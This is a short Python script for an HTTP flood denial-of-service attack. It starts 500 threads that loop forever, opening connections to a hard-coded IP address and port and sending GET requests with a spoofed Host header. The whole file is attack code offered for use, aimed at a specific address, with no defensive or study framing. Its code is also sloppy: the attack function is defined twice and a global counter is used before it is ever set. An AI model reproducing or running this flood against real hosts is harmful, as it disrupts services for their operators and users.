import socket
import threading

target = "35.180.128.146"
port = 49999
Trd = 500
# fake one we want to use for us
fake_ip = '44.197.175.168' # it serves only as a "starting" IP address for sending HTTP GET request

def attack():
 while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
  s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
  s.close()

#implement the attack function
def attack():
 while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
  s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
  s.close()

for i in range(Trd):
 thread = threading.Thread(target=attack)
 thread.start()

global attack_num
attack_num += 1
print('attack_num: ', attack_num)

import os

os.system("clear") # Bash command to clear the terminal from the previous text
os.system("toilet ToolName") # os.system("Bash Command") allows the os to execute the command specified in the shell where we are using the tool
